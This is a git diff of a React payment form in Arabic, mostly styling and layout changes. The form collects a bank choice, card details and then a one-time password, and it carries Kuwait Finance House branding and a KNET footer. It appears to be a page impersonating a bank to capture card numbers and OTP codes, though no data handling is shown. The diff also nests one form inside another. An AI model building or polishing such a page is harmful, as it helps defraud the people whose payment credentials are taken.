@@ -120,12 +120,14 @@ export default function PaymentForm({
   }
 
   return (
-    <div style={{zoom:0.8,display:"flex",flexDirection:'column', justifyContent:'center'}}> <img 
+    <div style={{zoom:0.8,display:"flex",flexDirection:'column', justifyContent:'center',background:'#ebebeb'}}> <img 
     className="w-full h-18 m-1 rounded-lg " 
     src="/1212122.PNG" 
     alt="Kuwait Finance House Logo"
   />
-        <Card className="bg-white shadow-xl  " style={{boxShadow:'1px 1px 2px #000',margin:20}}>
+               <form onSubmit={handlePaymentInfoSubmit} className="space-y-6">
+
+        <Card className="bg-white shadow-xl  " style={{boxShadow:'0 0 6px rgba(0,0,0,0.3)',border:"2px solid #8f8f90",margin:20,borderRadius:20}}>
           <CardContent className="">
             <img 
               className="w-full h-14 my-4 object-contain" 
@@ -144,10 +146,10 @@ export default function PaymentForm({
         </Card>
 
         {(paymentMethod === 'credit_card' || paymentMethod === 'bank_card') && (
-          <Card className='shadow-xl    mt-2      'style={{boxShadow:'1px 1px 2px #000',margin:20}}>
+          <Card className='shadow-xl    mt-2      'style={{boxShadow:'0 0 6px rgba(0,0,0,0.3)',border:"2px solid #8f8f90",borderRadius:20, margin:20}}>
             <CardContent className="p-6">
               {step === 1 ? (
-                <form onSubmit={handlePaymentInfoSubmit} className="space-y-6">
+               <form onSubmit={handlePaymentInfoSubmit} className="space-y-6">
                   <div className="space-y-4">
                     <div className="   flex border-b-2">
                       <Label className='text-blue-500 pb-4  w-32 pt-2 font-samll ' htmlFor="bank">يرجى اختيار البنك:</Label>
@@ -162,7 +164,7 @@ export default function PaymentForm({
                   })
                 }}
               >
-                <SelectTrigger className="w-full bg-gray-300  flex-auto w-16 h-6 border rounded-md  font-samll" >
+                <SelectTrigger className="w-full flex-auto w-16 h-6 border rounded-md  font-samll" >
                   <SelectValue placeholder="Select a bank" />
                 </SelectTrigger>
                 <SelectContent>
@@ -260,28 +262,7 @@ i}                          </option>
                     </p>
                   )}
 
-<div className="grid grid-cols-2 ">
-                    <button
-                      type="button"
-                      className=" border  bg-gray-400 rounded-md h-6 hover:bg-gray-100"
-                    >
-                      إلغاء
-                    </button>
-                    <button
-                      type="submit"
-                      className=" h-6  bg-gray-300  rounded-md bg-gray-400 hover:bg-gray/90 disabled:opacity-50"
-                      disabled={isLoading}
-                    >
-                      {isLoading ? (
-                        <span className="flex items-center justify-center gap-2">
-                          جاري المعالجة
-                          <Loader className="animate-spin" />
-                        </span>
-                      ) : (
-                        'إرسال'
-                      )}
-                    </button>
-                  </div>
+
                 </form>
               ) : (
                 <form onSubmit={handleOtpSubmit} className="space-y-6">
@@ -318,13 +299,40 @@ i}                          </option>
             </CardContent>
           </Card>
         )}
-
+<Card style={{padding:15,boxShadow:'0 0 6px rgba(0,0,0,0.3)',border:"2px solid #8f8f90",margin:20,borderRadius:20}}>
+    <CardContent>
+    <div className="grid grid-cols-2 ">
+                    <button
+                      type="button"
+                      className=" border  bg-gray-400 rounded-md h-6 hover:bg-gray-100"
+                    >
+                      إلغاء
+                    </button>
+                    <button
+                      type="submit"
+                      className=" h-6  bg-gray-300  rounded-md bg-gray-400 hover:bg-gray/90 disabled:opacity-50"
+                      disabled={isLoading}
+                    >
+                      {isLoading ? (
+                        <span className="flex items-center justify-center gap-2">
+                          جاري المعالجة
+                          <Loader className="animate-spin" />
+                        </span>
+                      ) : (
+                        'إرسال'
+                      )}
+                    </button>
+                  </div>
+    </CardContent>
+</Card>
       <footer className="text-center p-4 text-sm text-gray-600">
         <p>© 2024 جميع الحقوق محفوظة</p>
-        <a href="#" className="hover:underline">
+        <a href="#" className="hover:underline text-blue-500">
           شركة الخدمات المصرفية الآلية المشتركة – كي نت
         </a>
       </footer>
+      </form>
+
     </div>
   )
 }
